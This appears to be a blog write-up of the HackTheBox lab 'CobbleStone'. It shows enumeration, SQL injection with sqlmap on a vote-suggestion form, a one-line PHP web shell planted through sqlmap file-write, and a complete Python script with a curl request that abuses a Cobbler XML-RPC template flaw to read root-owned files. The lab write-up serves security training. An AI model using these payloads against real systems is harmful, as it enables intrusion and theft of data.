---
layout: post
title: HackTheBox CobbleStone
description: An insane-rated HTB Lab
category: Labs
tags: sqli sqlmap cobbler privilege escalation rce sql mysql mariadb hash hashcat
image: assets/htb-cobble-preview.png
date: 2025-08-16 17:05 +0100
---
# TL;DR 

## Enumeration 

### Nmap 
The usual basic `nmap` scan: 
```bash 
$ nmap $target -sV -sC -vv -Pn -oN cobble-def

<REDACTED>

PORT   STATE SERVICE REASON         VERSION                                          
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)    
| ssh-hostkey:                                                                       
|   256 50:ef:5f:db:82:03:36:51:27:6c:6b:a6:fc:3f:5a:9f (ECDSA)                      
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBCfBUkQ4sz
y00s+EbTzIMq4Cv/mOkGWCD8xewIgvZ4zDI5pPhUaVYNsPaUmYzXgi0DzCy6s//8a1YFcyH398Nc=        
|   256 e2:1d:f3:e9:6a:ce:fb:e0:13:9b:07:91:28:38:ec:5d (ED25519)                    
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICuDtua7ciUfRA2uUH+ergsCOdq0Aaoakru1kQ9/OWPs   
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.62                              
| http-methods:                                                                      
|_  Supported Methods: GET HEAD POST OPTIONS                                         
|_http-server-header: Apache/2.4.62 (Debian)                                         
|_http-title: Cobblestone - Official Website
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
>A UDP and full ports TCP scan showed some services running, but nothing useful now.
{: .prompt-warning }

### Subdomains

Upon visiting the website, we find three domains to visit: 

```bash 
echo 10.10.11.81 cobblestone.htb vote.cobblestone.htb deploy.cobblestone.htb
```
And we're facing the following web app: 

![main](assets/htb-cobble-1.png)

![deploy](assets/htb-cobble-2.png)

![vote](assets/htb-cobble-3.png)


### Basic web recon 

Here is what `wappalyzer` showed: 


![Wappalyzer](assets/htb-cobble-4.png){: .normal }


With `whatweb`: 

```bash 
$ whatweb cobblestone.htb                                            

ERROR Opening: https://cobblestone.htb - Connection refused - connect(2) for "10.10.11.81" port 443
http://cobblestone.htb [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.10.11.81], JQuery, Script[text/javascript], Title[Cobblestone - Official Website]
```
### Fuzzing 

I ran `Ffuf` for both vhosts and directories, nothing out of the usual or important. We move on to the website.

### Poking Around the website 
#### Main Domain
![skins](assets/htb-cobble-5.png)

Visiting the main domain `cobblestone.htb`, we find a portal to suggest a Minecraft skin to upload to the website. 
There are some default skins, I tried suggesting an already existing skin name, with an invalid IP, and it passed through saying that'll be reviewed by the admin.

I even tried setting up a simple python3 HTTP server, to see if something gets requested, but it lead to nothing.

#### Voting subdomain

The databases for `cobblestone.htb` and `vote.cobblestone.htb` aren't the same, logging in with the user already created at the main platform didn't authenticate us through the `vote.cobblestone.htb`. 

So after creating a new account we're facing this: 

![votepage1](assets/htb-cobble-6.png)
![votepage2](assets/htb-cobble-7.png)

And all the three already set suggested servers to vote for, aren't approved yet. Furthermore, setting up a python server and suggesting it will
be passed on, but not approved. 

![not approved](assets/htb-cobble-8.png)

And the actual upvoting isn't yet set up: 

![voting](assets/htb-cobble-9.png)

## Foothold

Now, testing for SQLi in the suggestion of the minecraft server proved fruitful. 

```bash 
sqlmap -r request.txt -p url --dbs --batch
```

![sqlmap1](assets/htb-cobble-10.png)

>Note that `request.txt` is the request intercepted from burpsuite while voting for a website.
{: .prompt-warning }

``` 
POST /suggest.php HTTP/1.1
Host: vote.cobblestone.htb
Content-Length: 23
Cache-Control: max-age=0
Origin: http://vote.cobblestone.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://vote.cobblestone.htb/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=2g3hf8jia64thhp0vnlgpahoi4
Connection: keep-alive

url=10.10.14.194%3A9443
```
{: file="request.txt"}

So we're into something. The field is indeed vulnerable. To test that even more: 

```bash 
sqlmap -r request.txt -p url -D vote --tables --batch
```

![sqlmap2](assets/htb-cobble-11.png)

## User Flag 

Poking around the databse, we can dump this: 

![sqlmap3](assets/htb-cobble-12.png)

Note that `evil@sal.htb` was my account, so this databse is useless for now, it's not of internal shit.
We won't attempt to crack the admin's password, it may even be an account created by another player, not the actual DB admin. 

>This was my greatest mistake. What you've just read is me on my way to waste hours trying to get a reverse shell. Which was successful at the end, but literally useless because the objective was to crack the `cobble` user hash and SSH into it. 
{: .prompt-danger }

Using crackstation, few seconds and we got the user `cobble` and the user flag.
>User Flag captured!
{: .prompt-tip }


## Pre-User Time-Wasting
>These are some of what I did to gain a rev shell back to my machine. Switching the vpns, UDP to TCP...etc but banging my head against the wall aren't included.

```bash 
sqlmap -r request.txt -p url -D vote -T users --dump --batch --no-cast
```
Now we'll go for testing an upload vulnerability.
First with a dummy file: 

```bash 
echo test > /tmp/test.txt
```

```bash
sqlmap -r request.txt -p url --file-write=/tmp/test.txt --file-dest=/var/www/html/test.txt
```
![sqlmapupload1](assets/htb-cobble-13.png)

The upload is possible, so we try a simple PHP payload: 

```php 
<?php system($_GET['cmd']); ?>
```
{: file="shell.php"}

```bash 
sqlmap -r request.txt -p url --file-write=shell.php --file-dest=/var/www/html/shell.php
```

Which is then confirmed: 

```bash
curl "http://cobblestone.htb/shell.php?cmd=id" --output -
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

At this point, I tried a lot of PHP rev shell payloads, uploaded them and accessing them lead to no hitback on the listener.
The only way it worked was to upload a bash reverse shell to the server, and then execute it, all through `curl`.
And proved correct:

![lekhraniya](assets/htb-cobble-14.png)
## Privilege Escalation

For privilege escalation, we have a very restricted shell, which was painfully reallistic. Until.

Running `ss`: 
```bash 
ss -tulnp
```

And we have a service at port `TCP/25115`. This was cobbler's used port. Check out what is the [Cobbler](https://cobbler.github.io/) service.

So to see what's being hosted in that port, we port forward it using: 
```bash 
ssh -L 25115:localhost:25115 cobbler@cobblestone.htb
```

Reading what's on [this](https://tnpitsecurity.com/blog/cobbler-multiple-vulnerabilities/) page, leads to the direct solution. 

```python
import xmlrpc.client
import traceback

COBBLER_URL = "http://127.0.0.1:25151/RPC2"
TARGET_FILE = "/root/root.txt"    # The file you want to read
DEST_FILE = "/leak"               # Template destination in Cobbler

def connect():
    try:
        return xmlrpc.client.ServerProxy(COBBLER_URL, allow_none=True)
    except:
        traceback.print_exc()
        return None

srv = connect()
tok = srv.login("", -1)

# 1. Create a distro
did = srv.new_distro(tok)
srv.modify_distro(did, "name", "pwn_distro", tok)
srv.modify_distro(did, "arch", "x86_64", tok)
srv.modify_distro(did, "breed", "redhat", tok)
srv.modify_distro(did, "kernel", "/boot/vmlinuz-6.1.0-37-amd64", tok)
srv.modify_distro(did, "initrd", "/boot/initrd.img-6.1.0-37-amd64", tok)
srv.save_distro(did, tok)

# 2. Create a profile
pid = srv.new_profile(tok)
srv.modify_profile(pid, "name", "pwn_profile", tok)
srv.modify_profile(pid, "distro", "pwn_distro", tok)
srv.save_profile(pid, tok)

# 3. Create a system pointing to the target file
sid = srv.new_system(tok)
srv.modify_system(sid, "name", "pwnsys", tok)
srv.modify_system(sid, "profile", "pwn_profile", tok)
srv.modify_system(sid, "template_files", {TARGET_FILE: DEST_FILE}, tok)
srv.save_system(sid, tok)

# 4. Sync changes
srv.sync(tok)

print("[+] Malicious system created.")
print("[+] You can now trigger it using curl to read the file.")
```
After running the previous python script, we can request the flag at `/root/root.txt` using: 
```bash 
curl -X POST http://127.0.0.1:25151 \
-H "Content-Type: text/xml" \
-d '<?xml version="1.0"?>
<methodCall>
  <methodName>get_template_file_for_system</methodName>
  <params>
    <param><value><string>pwnsys</string></value></param>
    <param><value><string>/leak</string></value></param>
  </params>
</methodCall>'
```

Within the request sent back to us, we will have the flag as a response within the XML returned. 

>Rooted!
{: .prompt-tip }




















